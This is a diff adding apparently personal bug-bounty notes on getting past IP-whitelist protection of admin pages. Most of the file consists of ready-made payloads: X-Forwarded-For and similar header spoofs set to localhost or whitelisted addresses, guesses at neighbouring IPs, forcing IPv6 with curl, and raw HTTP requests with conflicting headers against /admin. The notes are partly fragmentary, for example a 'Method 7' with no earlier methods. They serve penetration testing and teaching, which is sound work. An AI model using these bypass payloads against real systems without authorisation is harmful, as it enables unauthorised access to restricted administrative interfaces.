@@ -1,0 +1,137 @@
+# 
+
+IP Whitelisting bypass (spoofs a whitelisted IP) —→  add  extra headers  X-Forwarded-For with  ip address of the website 
+
+for ip address check if any error page showing ip address , 
+
+## Real Bug Bounty Example
+
+**HackerOne Report:**
+
+**Target:** `company.com/admin`
+
+**Discovery Process:**
+
+1. Tried accessing `/admin` → Got `403 Forbidden`
+2. Error message said: *"Access restricted to 10.0.0.0/8"*
+3. Tried `X-Forwarded-For: 10.0.0.1`
+4. **Got 200 OK!** 🎉 ( same as below but here the ip address is showing in the error page )
+
+### **Method 7: Trial and Error with Logical IPs**
+
+Smart attackers try **logical patterns**:
+
+**If the website is `example.com` (IP: 93.184.216.34):**
+
+Try nearby IPs:
+
+- `93.184.216.1` (gateway)
+- `93.184.216.0/24` (whole subnet)
+
+## ipv4 and ipv6 bypass
+
+### **Real World Example**
+
+**Bug Bounty Report:**
+
+**Target:** Admin panel at `company.com/admin`
+
+**Discovery:**
+
+1. Tried IPv4 connection → Blocked ❌
+2. Checked if server supports IPv6: `ping6 company.com` → Yes! ✅
+3. Connected via IPv6 → **Admin panel loaded!** 🚨
+
+curl -6 https://example.com/admin
+
+### **How to Test This**
+
+**Check if target supports IPv6:**
+
+bash
+
+`# Try to resolve IPv6 address
+nslookup -type=AAAA example.com
+
+# If it returns an IPv6 address like:
+# 2606:2800:220:1:248:1893:25c8:1946
+# Then the server supports IPv6!`
+
+**Connect using IPv6:**
+
+bash
+
+`curl -6 https://example.com/admin
+# The -6 flag forces IPv6 connection`
+
+**In Burp Suite:**
+
+- Configure Burp to use IPv6
+- Send requests and check if whitelist is bypassed
+
+## Local host
+
+X-Forwarded-For: 127.0.0.1
+
+X-Forwarded-For: ::1       IPv6 localhost
+
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: 127.0.0.2
+X-Forwarded-For: 127.1
+X-Forwarded-For: 0
+
+## Multiple header
+
+adding multiple headers in the request 
+
+- `X-Forwarded-For`
+- `X-Real-IP`
+- `X-Originating-IP`
+- `X-Client-IP`
+- `Client-IP`
+- `True-Client-IP`
+
+eg: 
+
+GET /admin HTTP/1.1
+Host: [example.com](http://example.com/)
+X-Forwarded-For: 203.0.113.5  ← Whitelisted IP (passes check!)
+X-Real-IP: 1.2.3.4             ← Your real IP (gets admin access!
+
+```
+
+```
+
+# Test 1: X-Forwarded-For
+
+ "X-Forwarded-For: 127.0.0.1"
+
+# Test 2: X-Real-IP
+
+"X-Real-IP: 127.0.0.1"
+
+# Test 3: X-Originating-IP
+
+"X-Originating-IP: 127.0.0.1"
+
+# Test 4: X-Client-IP
+
+"X-Client-IP: 127.0.0.1"
+
+# Test 5: Client-IP
+
+ "Client-IP: 127.0.0.1"
+
+# Test 6: True-Client-IP
+
+"True-Client-IP: 127.0.0.1"
+
+# Test 7: Multiple IPs
+
+X-Forwarded-For: 127.0.0.1, 1.2.3.4
+
+# Test 8: Conflicting headers
+
+curl https://example.com/admin \
+-H "X-Forwarded-For: 127.0.0.1" \
+-H "X-Real-IP: 1.2.3.4"
